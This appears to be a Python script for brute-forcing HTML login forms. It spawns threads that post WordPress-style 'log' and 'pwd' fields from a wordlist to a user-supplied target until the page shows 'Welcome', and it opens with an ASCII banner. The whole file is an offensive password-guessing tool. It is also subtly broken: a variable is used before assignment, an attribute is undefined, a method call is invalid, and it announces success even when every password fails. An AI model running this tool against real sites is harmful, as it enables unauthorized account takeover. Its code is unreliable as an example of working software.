from io import BytesIO
from lxml import etree
from queue import Queue
from rich.console import Console

import requests
import threading
import time

class Bruter:
    def __init__(self, username, url, passwords):
        self.username = username
        self.url = url
        self.found = False
        self.passwords_len = len(passwords)
        console.print(f"\nBruteforce starting on {url}", style="bold red")
        console.print("Finished the setup where the username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def show_progress(self, trying):
        bar_max_width = 37
        bar_width = bar_max_width * trying // self.passwords
        bar = ("▉" * bar_width)  + ("-" * (bar_max_width - bar_width))
        progress = progress if progress != "99.9" else "100"
        bar = bar if progress != "100" else bar.replace("-", "▉")
        progress = "%.1f"%(trying / self.passwords * 100)
        console.print(f"[{bar}] {progress} %\t\t", end="\r", style="bold blue")
        if trying == self.passwords:
            print()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params["log"] = self.username
        trying = 0

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            console.print(f"Trying username/password [bold blue]{self.username}/{passwd:<10}[/bold blue]")
            params["pwd"] = passwd

            self.show_progress(trying)
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                break
            else:
                trying += 1
        
        self.found = True
        console.print(f"\nBruteforcing successful", style="bold blue")
        print("Username is %s" % self.username)
        print("Password is %s" % passwd)
        print("Done, now cleaning up other threads ...")

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for element in tree.findall("//input"):
        name = element.get("name")
        if name is not None:
            params[name] = element.get_value("value", None)
    
    return params
    
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
        
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def initialize():
    global console, SUCCESS, TARGET, WORDLIST
    console = Console()
    show_banner()
    console.print("\n\tA tool for HTML's autenthication form bruterorce\n", style="bold red")
    SUCCESS = "Welcome"
    TARGET = console.input("[bold blue][+][/bold blue] Type the target: ")
    console.print("\nYou cane use our wordlist [bold red]little_dictionary.txt[/bold red] from ians on its github repository", style="italic")
    WORDLIST = console.input("[bold blue][+][/bold blue] Type the directory of the wordlist: ")

    words = get_words()
    b = Bruter(console.input("[bold blue][+][/bold blue] Enter the username: "), TARGET, words)
    b.run_bruteforce(words)


def show_banner():
    banner = """
   |\                |\                |\                |\.
   || .---.          || .---.          || .---.          || .---.
   ||/_____\         ||/_____\         ||/_____\         ||/_____\.
   ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
   || \_-_/_         || \_-_/_         || \_-_/_         || \_-_/_
   :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.       :-"`'V'//-.
  / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `\.
 / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
/_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
\ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
 \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
 /\|_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |   /|/_   | Ll_\ |

    """
    console.print(banner, style="bold blue")

